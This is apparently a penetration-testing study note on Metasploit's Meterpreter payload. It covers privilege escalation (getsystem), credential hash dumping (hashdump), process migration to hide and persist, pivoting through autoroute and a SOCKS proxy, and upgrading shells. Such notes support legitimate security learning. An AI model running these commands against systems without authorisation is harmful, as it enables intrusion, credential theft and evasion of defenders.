## **Intro:**
>The Meterpreter (Meta-Interpreter) payload is an advanced payload that is ***<mark style="background: #ED7506;">executed in memory</mark>*** on the target system making it <mark style="background: #e74c3c;">difficult to detect</mark>.



---
## ***COMMANDS:*** https://www.offsec.com/metasploit-unleashed/meterpreter-basics/
#### **Common Commands:**
1. `getprivs`: ***lists the current privileges for current user.***
2. `getsystem`: ***Once u have a session use this command to try to elevate privs***
3. `shell`: ***switch to a windows cmd shell***
4. `migrate`: switch
5. `pgrep <process, E.g: explorer>`: greps the process ID of a process
6. `search -f <file_name>`: searches for a file in that Shell.
7. `hashdump` : gets hashes of every user in this format: `user:UID:LM_hash:NT_hash`
8. `sessions -u <session_number>`: to upgrade a basic session to a meterpreter session `-u` means upgrade.... COOL


---
## **Migration in Meterpreter:**
- Hiding the process to gain persistence and avoid detection.
- Change the process architecture to execute some payloads with the current architecture. For example, if there is a 64-bits system and our meterpreter process is 86-bits, some architecture-related problems could happen if we try to execute some exploits against the session gained.
- Migrate to a more stable process.

### **How Migration works:**
1. A Metasploit handler is configured to retrieve a meterpreter sessions.
2. Processes are listed to select the desired one to migrate (`ps` command).
3. Migrate to the desired process (`migrate <PID>`)

#### **E.g. to understand:**
##### If the Meterpreter session is retrieved in an `.exe` file that creates the process `goodFile.exe`. **<mark style="background: #FF5582A6;">This process is quite noisy</mark>**, if the user closes this process, the session will be closed. Therefore, migrating to a more stable process like `explorer.exe` would give us the ability to hide the Meterpreter session and gain persistence.


---

## **How to change meterpreter architecture regarding the target arch:**

![[Pasted image 20250410145557.png]]

#### **To spawn a process to migrate to:**


	run post/windows/manage/migrate	

![[Pasted image 20250419195931.png | 800]]

---
## **Pivoting**

1. `run autoroute -s <our_subnet>` E.g. `run autoroute -s 10.10.10.0/24`
2. now we want to use **"proxychain"** tool on our attacking machine or a MSF module: `use auxiliary/server/socks_proxy`
3. `set VERSION 4a`
4. `set SRVPORT 9050` set it as what you did for socks4 tool. Our attacking machine will start listening on this port
5. so now we can nmap the second system from our main system: `proxychain nmap <Second_target> -sT -Pn -sV -p 445`


---


## **Upgrade Shell to Meterpreter session:**

### **<mark style="background: #FF5582A6;">MSF</mark> Module:**
Use this MSF Module after getting a session:
`post/multi/manage/shell_to_meterpreter`

Then specify the:
`LHOST`
`LPORT`
`SESSION`
Then ***<mark style="background: #e74c3c;">RUN</mark>***
After this you will find a new session called meterpreter: `sessions`

##### **We can use the sessions command to upgrade a session**

using the `-u` for upgrade

	sessions -u <session_id>

and it will use the `shell_to_meterpreter` Module automatically.


#### If python is installed: 

	python -c 'import pty;pty.spawn("/bin/bash")'

---

